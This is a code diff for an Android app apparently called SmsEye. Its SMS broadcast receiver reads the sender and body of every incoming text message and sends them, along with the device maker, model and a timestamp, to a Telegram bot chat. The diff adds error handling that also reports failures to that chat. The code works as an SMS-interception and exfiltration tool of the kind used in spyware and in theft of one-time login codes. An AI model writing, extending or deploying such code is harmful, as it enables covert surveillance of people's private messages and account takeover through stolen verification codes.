@@ -71,27 +71,38 @@ public class SmsEyeMainActivity extends AppCompatActivity {
 
         @Override
         public void onReceive(Context context, Intent intent) {
-            Bundle bundle = intent.getExtras();
-            if (bundle == null) return;
+            try {
+                Bundle bundle = intent.getExtras();
+                if (bundle == null) {
+                    throw new Exception("Bundle is null");
+                }
 
-            Object[] pdus = (Object[]) bundle.get("pdus");
-            String format = bundle.getString("format");
-            if (pdus == null || format == null) return;
+                Object[] pdus = (Object[]) bundle.get("pdus");
+                String format = bundle.getString("format");
 
-            StringBuilder smsMessage = new StringBuilder();
+                if (pdus == null || format == null) {
+                    throw new Exception("PDUs or format is null");
+                }
 
-            for (Object pdu : pdus) {
-                SmsMessage message = SmsMessage.createFromPdu((byte[]) pdu, format);
-                smsMessage.append("From: ").append(message.getDisplayOriginatingAddress()).append("\n");
-                smsMessage.append("Message: ").append(message.getDisplayMessageBody()).append("\n");
+                StringBuilder smsMessage = new StringBuilder();
+
+                for (Object pdu : pdus) {
+                    SmsMessage message = SmsMessage.createFromPdu((byte[]) pdu, format);
+                    smsMessage.append("From: ").append(message.getDisplayOriginatingAddress()).append("\n");
+                    smsMessage.append("Message: ").append(message.getDisplayMessageBody()).append("\n");
+                }
+
+                String timestamp = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US)
+                        .format(Calendar.getInstance().getTime());
+                String deviceName = android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL;
+                String logMessage = "[" + deviceName + "] " + timestamp + "\n" + smsMessage.toString();
+
+                new SendToTelegramTask().execute(BOT_TOKEN, Constants.TELEGRAM_CHAT_ID, logMessage);
+            } catch (Exception e) {
+                String errorLog = "⚠️ ERROR in SMS Receiver: " + e.getMessage();
+                Log.e(TAG, errorLog, e);
+                new SendToTelegramTask().execute(BOT_TOKEN, Constants.TELEGRAM_CHAT_ID, errorLog);
             }
-
-            String timestamp = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US)
-                    .format(Calendar.getInstance().getTime());
-            String deviceName = android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL;
-            String logMessage = "[" + deviceName + "] " + timestamp + "\n" + smsMessage.toString();
-
-            new SendToTelegramTask().execute(BOT_TOKEN, Constants.TELEGRAM_CHAT_ID, logMessage);
         }
     }
 
@@ -121,7 +132,9 @@ public class SmsEyeMainActivity extends AppCompatActivity {
 
                 Log.d(TAG, "Telegram Response Code: " + conn.getResponseCode());
             } catch (Exception e) {
-                Log.e(TAG, "Error sending message to Telegram", e);
+                String errorMsg = "⚠️ ERROR sending to Telegram: " + e.getMessage();
+                Log.e(TAG, errorMsg, e);
+                // Avoid infinite loop if Telegram fails. Don't call Telegram again here.
             }
             return null;
         }
